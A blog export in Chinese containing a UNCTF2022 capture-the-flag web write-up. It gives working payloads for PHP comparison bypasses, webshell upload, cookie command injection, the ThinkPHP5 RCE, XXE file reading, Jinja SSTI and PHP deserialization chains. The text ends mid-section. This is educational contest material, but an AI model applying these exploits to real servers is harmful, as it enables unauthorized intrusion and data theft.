<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Begin</title>
    <url>/uncategorized/Begin/</url>
    <content><![CDATA[<h1 id="Hello"><a href="#Hello" class="headerlink" title="Hello"></a>Hello</h1><h2 id="关于本博客"><a href="#关于本博客" class="headerlink" title="关于本博客"></a>关于本博客</h2><span id="more"></span>
<p>在入门CTF两个月之后，终于决定搭建自己的博客啦。</p>
<p>本博客记录我在学习CTF的过程中的一些学习笔记和心得，偶尔也会写一些随笔和感想啥的。建站之初，很多东西还不够完善，后续会慢慢改进。</p>
]]></content>
  </entry>
  <entry>
    <title>UNCTF2022-WP</title>
    <url>/CTF-WP/UNCTF2022-WP/</url>
    <content><![CDATA[<h1 id="UNCTF2022-WP-By-Zeroc"><a href="#UNCTF2022-WP-By-Zeroc" class="headerlink" title="UNCTF2022  WP  By  Zeroc"></a>UNCTF2022  WP  By  Zeroc</h1><p>本博客的第一篇正式文章，上周结束的<code>UNCTF</code>，我也是有幸登顶了校内赛，第一次拿到第一名对我来说还是很有意义的，继续加油吧。</p>
<meta name="referrer" content="no-referrer"/>

<span id="more"></span>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>只能说出的最好的应该是<strong>签到题</strong>（</p>
<h3 id="ezgame"><a href="#ezgame" class="headerlink" title="ezgame"></a>ezgame</h3><p>打开发现是一个打怪的游戏，肯定不能硬玩，先看游戏源码<code>main.js</code>。</p>
<p>试着查找<code>unctf</code>，还真找到了，boss死了后会触发一个函数，在控制台输出即可得到flag。</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056794.png" alt=""></p>
<h3 id="我太喜欢bilibili大学啦"><a href="#我太喜欢bilibili大学啦" class="headerlink" title="我太喜欢bilibili大学啦"></a>我太喜欢bilibili大学啦</h3><p>打开靶机是一个<code>phpinfo</code>的界面，先试着查找关键字。</p>
<p>结果发现直接ctrl+F查找flag即可。</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056690.png" alt=""></p>
<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>打开靶机后是一个<code>Apache2 Ubuntu Default Page</code>页面，访问<code>/index.php</code>得到源码。</p>
<p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]==<span class="number">0</span>&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key1&quot;</span>])&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key2&quot;</span>]))&#123;</span><br><span class="line">            <span class="variable">$key1</span>=<span class="variable">$_POST</span>[<span class="string">&quot;key1&quot;</span>];</span><br><span class="line">            <span class="variable">$key2</span>=<span class="variable">$_POST</span>[<span class="string">&quot;key2&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$key1</span>!==<span class="variable">$key2</span>&amp;&amp;<span class="title function_ invoke__">sha1</span>(<span class="variable">$key1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$key2</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>]))&#123;</span><br><span class="line">                    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|txt|cat|tac|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">                        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;有手就行&lt;/br&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;老套路了&lt;/br&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;很简单的，很快就拿flag了~_~&lt;/br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;百度就能搜到的东西&lt;/br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;easy 不 easy ,baby 真 baby,都是玩烂的东西，快拿flag！！！&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单的绕过和命令执行。</p>
<p>科学计数法绕过弱比较，数组绕过<code>sha1()</code>，利用<code>passthru()</code>进行命令执行即可，最后在环境变量里找到flag。</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//cbbb5195-0fe9-4e1a-8b27-81bcd415c731.node.yuzhian.com.cn/index.php?code=passthru(&quot;env&quot;);</span></span><br><span class="line">POST:</span><br><span class="line">a=<span class="number">0e7</span>&amp;key1[]=<span class="number">1</span>&amp;key2[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>
<h3 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h3><p>加<code>GIF89a</code>上传一个png之后抓包改为php，蚁剑连接后直接利用find命令查找flag即可。</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056363.png" alt=""></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056056.png" alt=""></p>
<h3 id="我太喜欢bilibili大学啦修复版"><a href="#我太喜欢bilibili大学啦修复版" class="headerlink" title="我太喜欢bilibili大学啦修复版"></a>我太喜欢bilibili大学啦修复版</h3><p>打开靶机是<code>phpinfo</code>界面，查找<code>hint</code>得到第一个hint：<code>admin_unctf.php</code>。</p>
<p>访问是一个登录界面，源码提示抓包看看：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056067.png" alt=""></p>
<p>得到登录密码：<code>unctf2022/unctf2022</code>。</p>
<p>显示页面源码。</p>
<p>接着就是简单的命令执行，利用管道符分割命令即可，传参的位置为cookie。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;FLAG=nonono&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;username or password is empty&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&quot;unctf2022&quot;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="string">&quot;unctf2022&quot;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        @<span class="title function_ invoke__">system</span>(<span class="string">&quot;ping &quot;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;username or password error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">Cookie: cmd=<span class="number">127.0</span>.<span class="number">0.1</span>|cat /flag</span><br></pre></td></tr></table></figure>
<p>得到一串base64编码，解码后得到一个网址<code>https://space.bilibili.com/673907356</code>，访问即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056793.png" alt=""></p>
<h3 id="302"><a href="#302" class="headerlink" title="302"></a>302</h3><p>(我只能说，屑)</p>
<p>考察<strong>页面重定向</strong>等知识，首先抓包，直接访问原地址：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056676.png" alt=""></p>
<p>要求<strong>get和post传参</strong>：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056574.png" alt=""></p>
<p>接着需要<strong>伪造cookie</strong>，伪造后得到一个phpinfo界面，查找<code>UNCTF</code>即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056605.png" alt=""></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST /?miku=puppy HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> aaf2bd2d<span class="number">-98</span>a3<span class="number">-4691</span><span class="number">-9255</span>-f8c5272a9181.node.yuzhian.com.cn</span><br><span class="line">User-Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv<span class="punctuation">:</span><span class="number">106.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">106.0</span></span><br><span class="line">Accept<span class="punctuation">:</span> text/html<span class="punctuation">,</span>application/xhtml+xml<span class="punctuation">,</span>application/xml;q=<span class="number">0.9</span><span class="punctuation">,</span>image/avif<span class="punctuation">,</span>image/webp<span class="punctuation">,</span>*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Pragma: no-cache</span></span><br><span class="line"><span class="comment">Cookie: admin=true;</span></span><br><span class="line"><span class="comment">Cache-Control: no-cache</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 10</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">micgo=ikun</span></span><br></pre></td></tr></table></figure>
<h3 id="给你一刀"><a href="#给你一刀" class="headerlink" title="给你一刀"></a>给你一刀</h3><p>打开靶机后是一个<code>ThinkPHP5</code>的界面，可以联想到其漏洞，漏洞出现的原因在于ThinkPHP5框架底层对控制器名过滤不严，从而可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致远程命令执行漏洞。</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=env</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056337.png" alt=""></p>
<h3 id="听说PHP有个XXE"><a href="#听说PHP有个XXE" class="headerlink" title="听说PHP有个XXE"></a>听说PHP有个XXE</h3><p>页面提示访问<code>hint</code>，下载文件后打开：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056105.png" alt=""></p>
<p>访问<code>dom.php</code>：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056647.png" alt=""></p>
<p><code>DOMDocument::loadXML():</code>可以从字符串中加载xml文档，存在<code>XXE</code>漏洞，直接试着访问根目录下的flag文件得到flag。</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dom.php HTTP/1.1</span><br><span class="line">Host: 713bc3e7-0605-4f6d-ad6d-0255de339625.node.yuzhian.com.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Content-Length: 138</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;!DOCTYPE XXE [ </span><br><span class="line"> </span><br><span class="line">&lt;!ENTITY zeroc SYSTEM &quot;file:///flag&quot; &gt;]&gt;</span><br><span class="line"> </span><br><span class="line">&lt;abc&gt;&amp;zeroc;&lt;/abc&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056716.png" alt=""></p>
<h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy ssti"></a>easy ssti</h3><p>打开靶机是一个登录界面，试着登陆一下<code>&#123;&#123;7*7&#125;&#125;</code>：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056689.png" alt=""></p>
<p>发现存在模板注入漏洞，注入点在<code>Username</code>。</p>
<p>一些关键字被过滤，利用字符串拼接绕过即可，很基础的SSTI。</p>
<p>最后可在<code>env</code>中找到flag。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">user=&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>][<span class="string">&#x27;__bas&#x27;</span><span class="string">&#x27;es__&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;__subcla&#x27;</span><span class="string">&#x27;sses__&#x27;</span>]()[<span class="number">108</span>][<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>)[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;env&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;&amp;pwd=</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202056392.png" alt=""></p>
<h3 id="ezunseri"><a href="#ezunseri" class="headerlink" title="ezunseri"></a>ezunseri</h3><p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;1!5!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="string">&quot;test123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot; JUST FOR FUN&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;UNCTF&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name.<span class="variable language_">$this</span>-&gt;code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code = <span class="string">&#x27;3.1415926&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;key-&gt;name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[pop]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Login</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一道PHP反序列化的题。</p>
<p>首先利用点在<code>Exec</code>的<code>execute</code>方法中，在<code>__invoke()</code>中调用了这个方法，那么就需要寻找<code>__invoke()</code>的触发点，发现<code>Test</code>的<code>__toString()</code>中存在利用点，而<code>Exec</code>中的<code>__get()</code>存在<code>echo</code>可以触发<code>__toString()</code>，刚好在<code>Login</code>的<code>__destruct()</code>中可以出发<code>__get()</code>方法，那么利用链就形成了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Login::__destruct()--&gt;Exec::__get()--&gt;Test::__toString()--&gt;Exec::__invoke()--&gt;Exec::execute()</span><br></pre></td></tr></table></figure>
<p>这里需要注意传参需要进行<code>url</code>编码，因为存在<code>private</code>变量，还需要在传参时修改一下<code>Exec</code>类的成员数目来绕过<code>__wakeup()</code>。</p>
<p>生成payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot; JUST FOR FUN&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Login</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key = <span class="keyword">new</span> <span class="title class_">Exec</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key-&gt;content = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key-&gt;content-&gt;test = <span class="keyword">new</span> <span class="title class_">Exec</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key-&gt;content-&gt;test-&gt;content = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop=O%3A5%3A%22Login%22%3A3%3A%7Bs%3A11%3A%22%00Login%00name%22%3BN%3Bs%3A4%3A%22code%22%3Bs%3A13%3A%22+JUST+FOR+FUN%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A2%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7Ds%3A3%3A%22key%22%3BN%3B%7D%7D%7D</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055856.png" alt=""></p>
<h3 id="poppop"><a href="#poppop" class="headerlink" title="poppop"></a>poppop</h3><p>打开靶机后访问<code>index.php</code>，</p>
<p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;key2-&gt;<span class="title function_ invoke__">abab</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;poc&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;poc&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>与上一道题类似，这里就直接写利用链了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">B::__destruct()--&gt;C::__toString()--&gt;A::__call()</span><br></pre></td></tr></table></figure>
<p>生成payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key2 = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;code = <span class="string">&quot;system(&#x27;env&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;key = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">poc=O%3A1%3A%22B%22%3A1%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%27env%27%29%3B%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure>
<p>这里同样需要修改一下A的成员变量数目来绕过<code>__wakeup()</code>。</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055366.png" alt=""></p>
<h3 id="babynode"><a href="#babynode" class="headerlink" title="babynode"></a>babynode</h3><p>怎么说，一道基础到不能再基础的原型链污染。</p>
<p>题目源码：</p>
